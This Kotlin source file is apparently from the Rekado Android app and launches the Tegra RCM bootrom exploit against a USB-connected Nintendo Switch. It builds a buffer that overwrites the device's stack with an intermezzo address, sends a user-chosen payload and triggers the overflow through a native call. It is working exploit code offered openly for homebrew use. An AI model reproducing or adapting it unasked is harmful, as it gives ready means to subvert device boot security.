package com.pavelrekun.rekado.services.payloads

import android.content.Context
import android.content.ServiceConnection
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbInterface
import android.hardware.usb.UsbManager
import com.pavelrekun.rekado.RekadoApplication
import com.pavelrekun.rekado.services.logs.LogHelper
import com.pavelrekun.rekado.services.logs.LogHelper.ERROR
import com.pavelrekun.rekado.services.logs.LogHelper.INFO
import com.pavelrekun.rekado.services.usb.USBHandler
import com.pavelrekun.rekado.services.utils.Utils
import java.io.FileInputStream
import java.io.IOException
import java.nio.ByteBuffer
import java.nio.ByteOrder

class PayloadLoader : USBHandler {

    companion object {
        init {
            System.loadLibrary("payload_launcher")
        }

        private const val RCM_PAYLOAD_ADDR = 0x40010000
        private const val INTERMEZZO_LOCATION = 0x4001F000
        private const val PAYLOAD_LOAD_BLOCK = 0x40020000
        private const val MAX_LENGTH = 0x30298
    }

    private lateinit var usbConnection: UsbDeviceConnection
    private lateinit var usbInterface: UsbInterface

    override fun handleDevice(device: UsbDevice) {
        LogHelper.log(INFO, "Triggering selected payload!")

        val context = RekadoApplication.instance.applicationContext

        val usbManager = context.getSystemService(Context.USB_SERVICE) as UsbManager
        usbInterface = device.getInterface(0)

        val startEndpoint = usbInterface.getEndpoint(0)
        val endEndpoint = usbInterface.getEndpoint(1)

        usbConnection = usbManager.openDevice(device)
        usbConnection.claimInterface(usbInterface, true)

        /* [1] - Read device ID */

        val deviceID = ByteArray(16)
        if (usbConnection.bulkTransfer(startEndpoint, deviceID, deviceID.size, 999) != deviceID.size) {
            LogHelper.log(ERROR, "Failed to get Device ID!")
            return
        }


        LogHelper.log(INFO, "Device ID: ${Utils.bytesToHex(deviceID)}")

        /* [2] - Building payload */

        val payload = ByteBuffer.allocate(MAX_LENGTH)
        payload.order(ByteOrder.LITTLE_ENDIAN)

        payload.putInt(MAX_LENGTH)
        payload.put(ByteArray(676))

        // smash the stack with the address of the intermezzo
        var i = RCM_PAYLOAD_ADDR
        while (i < INTERMEZZO_LOCATION) {
            payload.putInt(INTERMEZZO_LOCATION)
            i += 4
        }

        val intermezzo: ByteArray
        try {
            val intermezzoStream = context.assets.open("intermezzo.bin")
            intermezzo = ByteArray(intermezzoStream.available())
            intermezzoStream.read(intermezzo)
            intermezzoStream.close()
        } catch (e: IOException) {
            LogHelper.log(0, "Failed to read intermezzo: $e")
            return
        }

        payload.put(intermezzo)

        payload.put(ByteArray(PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION - intermezzo.size))

        try {
            payload.put(getPayload())
        } catch (e: IOException) {
            LogHelper.log(ERROR, "Failed to read payload: $e")
            return
        }

        val unPaddedLength = payload.position()
        payload.position(0)
        // always end on a high buffer
        var lowBuffer = true
        val chunk = ByteArray(0x1000)
        var bytesSent = 0

        while (bytesSent < unPaddedLength || lowBuffer) {
            payload.get(chunk)

            if (usbConnection.bulkTransfer(endEndpoint, chunk, chunk.size, 999) != chunk.size) {
                LogHelper.log(ERROR, "Sending payload failed at offset $bytesSent")
                return
            }
            lowBuffer = lowBuffer xor true
            bytesSent += 0x1000
        }

        LogHelper.log(INFO, "Sent $bytesSent bytes")

        // 0x7000 = STACK_END = high DMA buffer address
        when (nativeTriggerExploit(usbConnection.fileDescriptor, 0x7000)) {
            0 -> LogHelper.log(INFO, "Exploit triggered!")
            -1 -> LogHelper.log(ERROR, "SUBMITURB failed!")
            -2 -> LogHelper.log(ERROR, "DISCARDURB failed!")
            -3 -> LogHelper.log(ERROR, "REAPURB failed!")
            -4 -> LogHelper.log(ERROR, "Wrong URB reaped!  Maybe that doesn't matter?")
        }
    }

    override fun releaseDevice() {
        usbConnection.releaseInterface(usbInterface)
    }

    private fun getPayload(): ByteArray {
        val chosenPayload = PayloadHelper.getChosen()
        val chosenPayloadFile = FileInputStream(chosenPayload.path)

        LogHelper.log(INFO, "Opening chosen payload: ${chosenPayload.name}")

        val chosenPayloadData = ByteArray(chosenPayloadFile.available())
        LogHelper.log(INFO, "Read ${Integer.toString(chosenPayloadFile.read(chosenPayloadData))} bytes from payload file!")

        chosenPayloadFile.close()
        return chosenPayloadData
    }


    /**
     * A native method that is implemented by the 'payload_launcher' native library,
     * which is packaged with this application.
     */
    private external fun nativeTriggerExploit(fd: Int, length: Int): Int
}